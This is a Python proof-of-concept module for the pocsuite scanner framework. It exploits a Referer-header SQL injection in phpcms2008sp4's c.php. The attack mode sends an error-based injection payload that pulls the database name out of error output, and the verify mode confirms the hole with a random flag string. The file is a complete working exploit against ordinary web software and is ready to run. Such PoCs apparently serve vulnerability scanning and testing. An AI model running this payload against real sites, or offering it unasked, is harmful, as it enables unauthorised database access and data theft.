#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'phpcms2008 c.php referer sql injection'
    vulID = '0'
    author = ['LRestless']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://shuimugan.com/bug/view?bug_no=16639']
    desc = '''phpcms2008 referer 主要针对phpcms2008sp4 c.phpSQL注入'''

    vulDate = '2013-5-31'
    createDate = '2019-03-26'
    updateDate = '2019-03-26'

    appName = 'phpcms2008sp4'
    appVersion = '2008sp4'
    appPowerLink = 'http://www.phpcms.cn/'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/c.php?id=1"
        payload = "1',(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),(SELECT concat(0x7e,database(),0x7e)))a from information_schema.tables group by a)b),'"
        header = {
            'referer': payload
        }
        resp = s.get(self.url, headers=header)
        time.sleep(2)
        dbname = re.search('~(.*?)~', resp.content)
        if dbname:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname.group(1)
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        s = req.Session()
        s.get(self.url)
        self.url = self.url.strip('/') + "/c.php?id=1"
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        payload = "1',(SELECT 1 FROM (select count(*), concat(floor(rand(0)*2),(SELECT {}))a from information_schema.tables group by a)b),'".format(flag)
        header = {
            'referer': payload
        }
        resp = s.get(self.url, headers=header)
        time.sleep(2)
        if flag in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

